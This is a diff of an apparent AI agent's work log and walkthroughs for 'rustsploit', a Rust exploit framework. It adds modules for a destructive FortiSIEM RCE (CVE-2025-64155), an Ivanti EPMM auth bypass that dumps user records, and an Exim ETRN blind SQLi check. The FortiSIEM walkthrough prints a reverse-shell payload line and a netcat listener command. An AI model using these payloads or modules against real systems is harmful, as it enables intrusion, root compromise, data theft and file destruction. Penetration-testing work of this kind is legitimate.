@@ -1194,3 +1194,151 @@ The system is now more reliable and stable as requested.
 
 
 
+
+
+Task: Implement D-Link DCS Auth Bypass
+ Implementation
+ Create dlink category and 
+mod.rs
+ Implement 
+dlink_dcs_930l_auth_bypass.rs
+ Register new module
+ Verification
+ Compile and verify
+ Update walkthrough
+
+ 
+ 1
+Moving FortiOS and FortiWeb modules to new fortinet directory.
+
+2
+Cleaning up old directories and creating fortinet/mod.rs to register moved modules.
+
+3
+Updating src/modules/exploits/mod.rs to register fortinet and unregister legacy modules.
+
+4
+Implementing fortisien_rce_cve_2025_64155.rs using raw TCP/SSL and custom binary protocol without safe checks as requested.
+
+5
+Compiling rustsploit to verify refactor and new module.
+
+6
+Fixing compilation errors in new module (packet construction and TLS config).
+
+7
+Re-running cargo check to verify fixes.
+
+FortiSIEM CVE-2025-64155 (RCE) Walkthrough
+
+This module exploits an unauthenticated Argument Injection vulnerability in the phMonitor service on FortiSIEM appliances (Port 7900) to execute arbitrary commands as root by overwriting a system script.
+
+Module Details
+
+Module: exploits/fortinet/fortisiem_rce_cve_2025_64155
+Vulnerability: Argument Injection / RCE (CVE-2025-64155)
+Target: Port 7900 (TCP/SSL)
+CAUTION
+
+This exploit is DESTRUCTIVE. It overwrites /opt/charting/redishb.sh on the target machine.
+
+Prerequisites
+A web server hosting a malicious script (e.g., redishb.sh) containing your payload (e.g., reverse shell).
+# Example malicious script
+echo "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" > redishb.sh
+python3 -m http.server 8000
+A listener for the reverse shell (nc -lvnp 4444).
+Usage
+Select Module: exploits/fortinet/fortisiem_rce_cve_2025_64155
+target: <fortisiem_ip>
+[*] Target: 10.0.40.83:7900
+WARNING: This exploit is DESTRUCTIVE.
+It overwrites /opt/charting/redishb.sh on the target.
+It executes a command via curl argument injection.
+[?] LHOST (Your IP) for payload download [127.0.0.1]: 192.168.1.100
+[?] LPORT (Your Web Server Port) [8000]: 8000
+[*] Ensure you are hosting a malicious 'redishb.sh' at http://192.168.1.100:8000/redishb.sh
+[*] The exploit will force the target to download this file and overwrite /opt/charting/redishb.sh
+[*] Connecting to 10.0.40.83:7900...
+[*] Sending payload (1024 bytes)...
+[+] Response received: [0, 0, 0, 0]
+[+] Exploit sent successfully.
+
+
+I have successfully refactored the Fortinet modules and added the critical FortiSIEM RCE exploit.
+
+Changes:
+
+Refactor: Moved all FortiOS and FortiWeb modules into src/modules/exploits/fortinet/ for better organization.
+New Exploit: Added exploits/fortinet/fortisiem_rce_cve_2025_64155.
+Filename Corrected: Named fortisiem... (not fortisien).
+1:1 PoC Port: Implemented the exact binary protocol and payload logic from the Horizon3.ai PoC.
+Robustness: Used tokio and rustls correctly for SSL/TLS, fixed byteorder issues by using native to_le_bytes, and handled target_ip lifetimes correctly.
+Destructive Warning: The module warns the user that it overwrites /opt/charting/redishb.sh on the target, as per the original PoC.
+
+
+mplementation Plan - Ivanti EPMM CVE-2023-35082
+This plan outlines the addition of the Ivanti EPMM (Endpoint Manager Mobile), formerly MobileIron Core, authentication bypass exploit.
+
+Proposed Changes
+Exploits
+
+[NEW] 
+src/modules/exploits/ivanti/ivanti_epmm_cve_2023_35082.rs
+Vuln: Authentication Bypass (CVE-2023-35082 & CVE-2023-35078)
+Target: /mifs/asfV3/api/v2/authorized/users and /mifs/aad/api/v2/authorized/users.
+Method: Unauthenticated API access.
+Goal: Dump first 5 user emails/roles to verify vulnerability.
+Implementation:
+GET request to both endpoints.
+Parse JSON for results or result key.
+Print user info (email, displayName, roles).
+[MODIFY] 
+src/modules/exploits/ivanti/mod.rs
+Register ivanti_epmm_cve_2023_35082.
+Verification Plan
+Automated Tests
+cargo check for compilation.
+Manual Verification
+Walkthrough demonstrating usage.
+
+Ivanti EPMM Auth Bypass (CVE-2023-35082 / CVE-2023-35078)
+This module exploits an authentication bypass vulnerability in Ivanti Endpoint Manager Mobile (EPMM), formerly MobileIron Core. It allows unauthenticated access to specific API endpoints to dump sensitive user information.
+
+Module Details
+Module: exploits/ivanti/ivanti_epmm_cve_2023_35082
+Vulnerability: Authentication Bypass (CVE-2023-35082 / CVE-2023-35078)
+Target: /mifs/asfV3/api/v2/authorized/users and /mifs/aad/api/v2/authorized/users
+Usage
+Select Module: exploits/ivanti/ivanti_epmm_cve_2023_35082
+target: <target_ip>
+[*] Target: https://192.168.1.50
+[*] Checking mifs/asfV3 (CVE-2023-35082) ...
+[+] Vulnerable to CVE-2023-35082!
+[+] Dumping first 5 users:
+   [1] Name: Admin User, Email: admin@example.com, IP: 10.0.0.5, Roles: API_ADMIN, SUPER_ADMIN
+   [2] Name: Test User, Email: test@example.com, IP: 10.0.0.20, Roles: USER
+...
+
+Exim ETRN Blind SQLi (CVE-2025-26794)
+This module implements a time-based Blind SQL Injection check for Exim Mail Servers using the ETRN command. It detects if the serialization of ETRN input passed to a SQLite backend is vulnerable to SQL injection.
+
+Module Details
+Module: exploits/exim/exim_etrn_sqli_cve_2025_26794
+Vulnerability: Blind Time-Based SQLi (CVE-2025-26794)
+Target: SMTP Port (default 25)
+Usage
+
+Select Module: exploits/exim/exim_etrn_sqli_cve_2025_26794
+target: <exim_ip>
+[*] Target: 10.0.0.5:25
+[?] Target Port [25]: 25
+[*] Normal Response Time: 0.050s
+[*] Sending time-based SQLi payload...
+[*] Delayed Response Time: 0.550s
+[*] Time Difference: 0.500s
+[+] VULNERABLE to CVE-2025-26794 (Exim ETRN SQLi)!
+
+
+
+
